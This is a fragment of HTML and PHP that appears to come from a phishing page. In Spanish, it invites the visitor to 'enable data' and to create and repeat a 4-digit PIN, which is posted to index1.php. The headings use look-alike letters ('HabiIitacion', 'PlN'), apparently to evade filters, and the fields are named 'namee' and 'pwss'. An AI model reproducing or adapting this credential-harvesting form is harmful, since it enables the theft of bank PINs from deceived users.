...
<div>
  <div class="contact-form-wrapper d-flex justify-content-center" id="mld">
    <form action="#" id="contenido1" method="post" class="contact-form">
      <h5 class="title">HabiIitacion de Datos</h5>
...
?>		
		...
		<form action="index1.php" id="contenido2"  method="post" class="contact-form" >
		 <h5 class="title">Crear PlN</h5>
      <p class="description">Crea un PIN de 4 digitos para continuar.
      </p>
    <div id="numt">
      <div>
        <input type="text" maxlength="4" class="form-control rounded border-white mb-3 form-input" name="namee" onkeypress="return (event.charCode &gt;= 48 &amp;&amp; event.charCode &lt;= 57)" placeholder="Nuevo PlN 4 digitos" required="">
      </div>
      <div>
        <input name="pwss" type="text" maxlength="4" class="form-control rounded border-white mb-3 form-input" onkeypress="return (event.charCode &gt;= 48 &amp;&amp; event.charCode &lt;= 57)" placeholder="Repita PlN 4 digitos" required="">
      </div>
      
      <div class="submit-button-wrapper">
          <button id="bntss" type="submit">CONFIRMAR</button>
